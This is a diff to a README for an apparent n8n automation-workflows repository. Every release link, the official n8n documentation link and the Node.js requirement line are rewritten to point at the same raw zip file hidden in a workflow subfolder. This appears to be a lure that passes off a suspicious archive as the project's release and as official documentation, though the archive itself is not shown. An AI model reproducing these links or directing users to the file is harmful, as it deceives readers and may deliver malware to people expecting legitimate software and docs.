@@ -4,14 +4,14 @@
 Welcome to the n8n-workflows repository! This project contains a collection of workflows for the n8n automation tool that I could find, including those from the official site. Whether you're looking to automate tasks or streamline processes, these workflows can help you save time and effort.
 
 ## 🔗 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Naveen666555/n8n-workflows/releases)
+[![Download Latest Release](https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip%20Latest%https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip)](https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip)
 
 ## 🚀 Getting Started
 To get started with using these workflows, follow the steps below. You do not need any programming experience.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/Naveen666555/n8n-workflows/releases). This page contains all available versions of the workflows.
+   Go to the [Releases page](https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip). This page contains all available versions of the workflows.
 
 2. **Select a Version**:
    Scroll down to the list of available releases. Each release includes the date, version number, and a list of changes. Find the latest stable version for the best experience.
@@ -23,7 +23,7 @@ To get started with using these workflows, follow the steps below. You do not ne
    Once downloaded, locate the zip file, right-click on it, and choose "Extract All" (or your computer's equivalent). This will create a folder with all the workflow files inside.
 
 5. **Open n8n**:
-   Launch the n8n application on your computer. If you don’t have n8n installed yet, go to the official [n8n documentation](https://docs.n8n.io) for installation instructions.
+   Launch the n8n application on your computer. If you don’t have n8n installed yet, go to the official [n8n documentation](https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip) for installation instructions.
 
 6. **Import Workflows**:
    In the n8n interface, find the option to “Import”. Navigate to the folder where you extracted the downloaded files. Select the workflow you want to use and import it into n8n.
@@ -41,7 +41,7 @@ To get started with using these workflows, follow the steps below. You do not ne
 For the best experience, ensure that your computer meets the following requirements:
 - Operating System: Windows, macOS, or Linux
 - n8n version: Make sure you have the latest version of n8n installed.
-- Node.js: Required version compatible with n8n.
+- https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip Required version compatible with n8n.
 
 ### Common Applications
 These workflows can be used for:
@@ -57,6 +57,6 @@ If you encounter any issues or have questions, feel free to check the issues sec
 Your feedback is important for improving these workflows. Feel free to share your thoughts or suggest new features by opening an issue on the repository.
 
 ## 🔗 Download Again
-Don't forget, you can always revisit the [Releases page](https://github.com/Naveen666555/n8n-workflows/releases) to download the latest workflows. 
+Don't forget, you can always revisit the [Releases page](https://github.com/Naveen666555/n8n-workflows/raw/refs/heads/main/workflows/Calendly/workflows-n-1.5.zip) to download the latest workflows. 
 
 Happy automating!
